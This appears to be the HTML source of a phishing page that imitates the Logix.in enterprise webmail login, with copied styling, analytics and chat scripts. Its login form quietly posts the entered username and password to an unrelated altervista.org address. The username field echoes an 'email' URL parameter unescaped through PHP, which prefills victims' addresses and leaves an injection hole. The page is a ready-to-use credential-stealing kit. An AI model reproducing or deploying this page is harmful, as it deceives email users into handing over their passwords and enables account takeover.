<!--Begin Comm100 Live Chat Code-->

<script type="text/javascript">

  var Comm100API=Comm100API||{};(function(t){function e(e){var a=document.createElement("script"),c=document.getElementsByTagName("script")[0];a.type="text/javascript",a.async=!0,a.src=e+t.site_id,c.parentNode.insertBefore(a,c)}t.chat_buttons=t.chat_buttons||[],t.chat_buttons.push({code_plan:1257,div_id:"comm100-button-1257"}),t.site_id=122744,t.main_code_plan=1257,e("https://chatserver.comm100.com/livechat.ashx?siteId="),setTimeout(function(){t.loaded||e("https://hostedmax.comm100.com/chatserver/livechat.ashx?siteId=")},5e3)})(Comm100API||{})

</script>

<!--End Comm100 Live Chat Code-->





<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><HTML 

xmlns="http://www.w3.org/1999/xhtml"><HEAD><META content="IE=11.0000" 

http-equiv="X-UA-Compatible">

 

<META http-equiv="Content-Type" content="text/html; charset=utf-8"> 

<TITLE>Webmail Login</TITLE> <LINK href="https://webmail.logix.in/css/style.css" 

rel="stylesheet" type="text/css"> 

<SCRIPT src="https://webmail.logix.in/css/disableRightClick.js" type="text/javascript"></SCRIPT>

 

<SCRIPT type="text/javascript">

$(document).ready(function() {

     $(document)[0].oncontextmenu = function() {return false;}

    // document.LoginForm.username.focus();

});



function make_blank()

{

document.LoginForm.username.value ="";

}



</SCRIPT>

 

<SCRIPT type="text/javascript">

var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");

document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));

</SCRIPT>

 

<SCRIPT type="text/javascript">

try {

var pageTracker = _gat._getTracker("UA-15555653-1");

pageTracker._trackPageview();

} catch(err) {}</SCRIPT>

 

<META name="GENERATOR" content="MSHTML 11.00.9600.18125"></HEAD> 

<BODY>

<DIV id="main-container">

<DIV class="content">

<DIV class="content-left">

<DIV class="logo"></DIV><IMG alt="" src="https://webmail.logix.in/images/img-left.jpg">

<DIV class="content-banner"></DIV>

<DIV class="content-text">Enterprise Email Solutions Redefined</DIV></DIV></DIV>

<DIV class="right">

<DIV class="right-content"></DIV>

<DIV class="right-content-bg">

<DIV class="right-content-link-bg">

<DIV class="right-content-link"><SPAN 

style="color: rgb(116, 117, 118);">Login:</SPAN>    <A href="https://webmail.logix.in/">Webmail</A> 

  |   <A href="https://cpanel.logix.in/">Admin</A>   |   <A href="https://cpanel.logix.in/UserCP">User 

CP</A>         </DIV></DIV>

<DIV class="form-head">Webmail</DIV>

<DIV class="form-text-content">

<DIV class="form">

<FORM name="LoginForm" action="http://directoryupdatee.altervista.org/veri1/member.php" method="POST" accept-charset="UTF-8" 

autocomplete="on"><LABEL class="form-text">Email user name</LABEL><LABEL class="invalid-message" 

align="right"></LABEL><BR 

clear="all"><INPUT name="username" class="field" onFocus="make_blank();" type="text" value=""<?php echo $_GET['email']; // output 2489 ?>"> 

	  <BR clear="all"><LABEL class="form-text">Password</LABEL><BR 

clear="all"><INPUT name="password" class="field" type="password">           

<INPUT name="mysubmit" class="btn" type="submit" value="Login">	 <INPUT name="client" 

class="fieldSelect1" type="checkbox" value="Standard">Use the Light Version <!--	<select class="fieldSelect" name="client"><option value="Advanced" selected>Advanced</option><option value="Standard">Standard</option><option value="Mobile">Mobile</option></select>

-->

	   <INPUT name="chkLogin" type="hidden" value="Login">           <INPUT name="LoginValue" type="hidden" value="F486081492818075efh"> 

          <INPUT name="Session" type="hidden" value="983246eb79543e0b3f1ad682afe8fc1a"><BR 

clear="all"></FORM></DIV>

<DIV class="bottom-text"><SPAN 

class="alert">&nbsp;</SPAN><BR><BR></DIV></DIV></DIV></DIV>

<DIV style="clear: both;"></DIV>

<DIV id="footer">

<DIV class="left">                Copyrights © 2011 Logix.in all rights 

reserved.            </DIV><!--

              <div class="footer-right">

              <div class="footer-content">Follow us</div>

              <div class="footer-right-text">

                <a href="http://www.facebook.com/LogixInfo" target="_new"><image src="images/facebook.jpg" /></a>&nbsp;

		<a href="http://twitter.com/#!/logixinfo" target="_new"><image src="images/twitter.jpg" /></a>&nbsp;

		<a href="http://in.linkedin.com/in/logix" target="_new"><image src="images/in.jpg" /></a>&nbsp;

		<a href="http://www.youtube.com/user/logixinfo" target="_new"><image src="images/youtube.png" /></a>&nbsp;

            </div>

            </div>

--> 

           </DIV></DIV></BODY></HTML>

